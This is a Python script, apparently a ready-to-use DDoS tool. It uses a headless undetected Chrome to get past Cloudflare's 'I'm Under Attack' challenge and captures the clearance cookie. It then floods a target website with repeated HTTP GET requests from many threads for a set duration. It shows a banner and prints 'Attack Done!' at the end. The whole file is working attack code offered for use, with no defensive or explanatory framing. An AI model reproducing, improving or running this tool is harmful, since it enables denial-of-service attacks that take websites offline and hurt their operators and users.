try:
	import os, ssl, sys, time, socket, socks, random, threading
	from requests.cookies import RequestsCookieJar
	import undetected_chromedriver as webdriver
	from urllib import parse
except Exception as e:
	sys.exit(e)

if len(sys.argv[1:]) != 3:
	print("> CF-UAM, Captcha Bypass | Made By FDc0d3\n")
	sys.exit(f"Usage:\npython3 {__file__} https://website.com <Thread> <Time> ")

target, thread, flood_time, = str(sys.argv[1]), int(sys.argv[2]), float(sys.argv[3]);timeout = time.time() + 1 * flood_time

def urlparser(url):
	parser = {}
	parser['path'] = parse.urlparse(url).path
	if parser['path'] == '':
		parser['path'] = '/'
	parser['host'] = parse.urlparse(url).netloc
	parser['scheme'] = parse.urlparse(url).scheme
	if ':' in parse.urlparse(url).netloc:
		parser['port'] = parse.urlparse(url).netloc.split(":")[1]
	else:
		parser['port'] = '443' if parse.urlparse(url).scheme == 'https' else '80'
		return parser

def get_cookie(url):
	global useragent, cookieJAR, cookie
	options = webdriver.ChromeOptions()
	arguments = [
    '--no-sandbox', '--disable-setuid-sandbox', '--disable-infobars', '--disable-logging', '--disable-login-animations',
    '--disable-notifications', '--disable-gpu', '--headless', '--lang=ko_KR', '--start-maxmized',
    '--user-agent=Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en']
	for argument in arguments:
		options.add_argument(argument)
	driver = webdriver.Chrome(options=options)
	driver.implicitly_wait(3)
	driver.get(url)
	for _ in range(100):
		cookies = driver.get_cookies()
		tryy = 0
		for i in cookies:
			if i['name'] == 'cf_clearance':
				cookieJAR = driver.get_cookies()[tryy]
				useragent = driver.execute_script("return navigator.userAgent")
				cookie = f"{cookieJAR['name']}={cookieJAR['value']}"
				driver.quit()
				return True
			else:
				tryy += 1
				pass
		time.sleep(1)
	driver.quit()
	return False

def headers(url):
    req =  'GET '+urlparser(url)['path']+' HTTP/1.1\r\n'
    req += 'Host: '+urlparser(url)['host'] +'\r\n'
    req += 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'
    req += 'Accept-Encoding: gzip, deflate, br\r\n'
    req += 'Accept-Language: ko,ko-KR;q=0.9,en-US;q=0.8,en;q=0.7\r\n'
    req += 'Cache-Control: max-age=0\r\n'
    req += 'Cookie: ' + cookie + '\r\n'
    req += f'sec-ch-ua: "Chromium";v="100", "Google Chrome";v="100"\r\n'
    req += 'sec-ch-ua-mobile: ?0\r\n'
    req += 'sec-ch-ua-platform: "Windows"\r\n'
    req += 'sec-fetch-dest: empty\r\n'
    req += 'sec-fetch-mode: cors\r\n'
    req += 'sec-fetch-site: same-origin\r\n'
    req += 'Connection: Keep-Alive\r\n'
    req += 'User-Agent: ' + useragent + '\r\n\r\n\r\n'
    return req

def attack():
	while time.time() < timeout:
		with socks.socksocket() as sock:
			sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
			try:
				sock.connect((str(urlparser(target)['host']), int(urlparser(target)['port'])))
				if urlparser(target)['scheme'] == 'https':
					ctx = ssl.create_default_context()
					ctx.check_hostname = False
					ctx.verify_mode = ssl.CERT_NONE
					sock = ctx.wrap_socket(sock, server_hostname=urlparser(target)['host'])
			except:
				sock.close()
				continue
			for _ in range(100):
				try:
					sock.send(str.encode(headers(target) * random.randint(5, 10)))
					sock.makefile(mode="wb").write(str.encode(headers(target) * random.randint(5, 10)))
				except:
					pass

def banner(target, thread, flood_time):
	print("""
                ╔═════════════════════════════════════╗
                ║   ╔══╗ ╔╦╗ ╔══╗ ╔══╗ ╔═╦╗ ╔═╗ ╔═╗   ║
                ║   ║══╣ ║║║ ║══╣ ║╔╗║ ║║║║ ║║║ ║║║   ║
                ║   ╠══║ ║║║ ╠══║ ║╠╣║ ║║║║ ║║║ ║║║   ║
                ║   ╚══╝ ╚═╝ ╚══╝ ╚╝╚╝ ╚╩═╝ ╚═╝ ╚═╝   ║
                ╚═════╦═════════════════════════╦═════╝
         ╔════════════╩═════════════════════════╩═══════════╗
           TARGET : {0}
           THREAD : {1}
           TIME   : {2}
         ╚══════════════════════════════════════════════════╝
""".format(str(target), int(thread), int(flood_time)))

def timer(t):
	while t > 0:
		minutes, seconds = divmod(t, 60)
		hours, minutes = divmod(minutes, 60)
		time_left = str(hours).zfill(2)+":"+str(minutes).zfill(2)+":"+str(seconds).zfill(2)
		print("TIME: "+time_left+"\r", end="")
		time.sleep(1)
		t = t -1
		if t == 0:
			print("[*] Attack Done! Exiting...")
			break

def main():
	print("[*] Bypassing CF... (Max 60s)")
	if get_cookie(target):
		for _ in range(int(thread)):
			threading.Thread(target=attack).start()
		print(f"Success! Cookie: {cookie}");time.sleep(2)
		os.system('clear');banner(target, thread, flood_time)
		timer(flood_time)
	else:
		sys.stdout.write("[*] Failed to Bypass CF")


if __name__ == '__main__':
	# bla bla bla bla
	main()
